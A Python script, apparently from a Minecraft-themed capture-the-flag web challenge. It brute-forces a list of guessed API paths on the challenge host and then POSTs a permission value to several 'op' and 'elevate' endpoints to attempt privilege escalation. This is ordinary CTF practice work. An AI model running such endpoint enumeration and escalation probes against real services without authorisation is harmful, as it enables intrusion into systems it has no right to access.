#!/usr/bin/env python3
import requests

BASE = 'https://m1n3-cr4f7.onrender.com'
s = requests.Session()
s.get(BASE, timeout=30)

def get(path, **kw):
    try:
        r = s.get(BASE + path, timeout=15, allow_redirects=False, **kw)
        return r.status_code, r.text[:600]
    except Exception as e:
        return 0, str(e)

def post(path, **kw):
    try:
        r = s.post(BASE + path, timeout=15, allow_redirects=False, **kw)
        return r.status_code, r.text[:600]
    except Exception as e:
        return 0, str(e)

# Brute-force API paths the challenge hints at:
# "legacy server telemetry", "elevate survival privileges to Operator"
# "navigate the dimensional rift", "unseal the secret"

paths_to_try = [
    # Legacy / telemetry
    '/api/v0/', '/api/v0/player', '/api/v0/telemetry',
    '/api/v1/', '/api/v1/player', '/api/v1/telemetry', '/api/v1/server',
    '/api/legacy/', '/api/legacy/player', '/api/legacy/telemetry',
    '/telemetry/', '/telemetry/legacy', '/server-telemetry',
    '/api/telemetry', '/api/telemetry/legacy',
    '/api/v2/server/telemetry', '/api/v2/telemetry',
    # Operator elevation
    '/api/v2/player/op', '/api/v2/player/elevate',
    '/api/v2/player/promote', '/api/v2/player/permission',
    '/api/v2/op', '/api/op', '/op',
    '/api/v2/player/profile/edit', '/api/v2/player/update',
    # Dimension
    '/api/v2/dimension', '/api/v2/dimensions',
    '/api/v2/dimension/nether', '/api/v2/dimension/end',
    '/api/v2/dimension/rift', '/api/v2/rift',
    '/dimension', '/dimensions', '/nether', '/end',
    # Chunks
    '/api/v2/chunk', '/api/v2/chunks',
    '/api/v2/chunk/Chunk_0x84', '/api/v2/world/chunk',
    # Command block
    '/api/v2/command', '/api/v2/command-block', '/api/v2/commandblock',
    '/command-block', '/commandblock', '/ancient-command',
    # Hidden / secret
    '/api/v2/secret', '/api/v2/flag', '/secret', '/hidden',
    '/api/v2/vault', '/vault', '/api/v2/unseal', '/unseal',
    # Misc
    '/api/v2/debug', '/api/v2/info', '/api/v2/status',
    '/api/v2/player/debug', '/api/v2/player/info',
    '/api/sign', '/api/sign/preview',
    '/api/v2/nbt', '/api/v2/world/seed', '/api/v2/world/data',
]

print('=== Enumerating API paths ===')
for path in paths_to_try:
    code, body = get(path, headers={'Accept': 'application/json'})
    if code not in [404, 0]:
        print(f'  [{code}] {path}')
        print(f'    {body[:300]}')
        print()

print()
print('=== Trying POST on key endpoints ===')
post_paths = [
    '/api/v2/player/op',
    '/api/v2/player/elevate',
    '/api/v2/player/promote',
    '/api/v2/player/permission',
    '/api/op',
    '/api/v2/op',
    '/api/v2/player/profile',
]
for path in post_paths:
    code, body = post(path, json={'permission': 3}, headers={'Accept': 'application/json'})
    if code not in [404, 0]:
        print(f'  POST [{code}] {path}')
        print(f'    {body[:300]}')
        print()
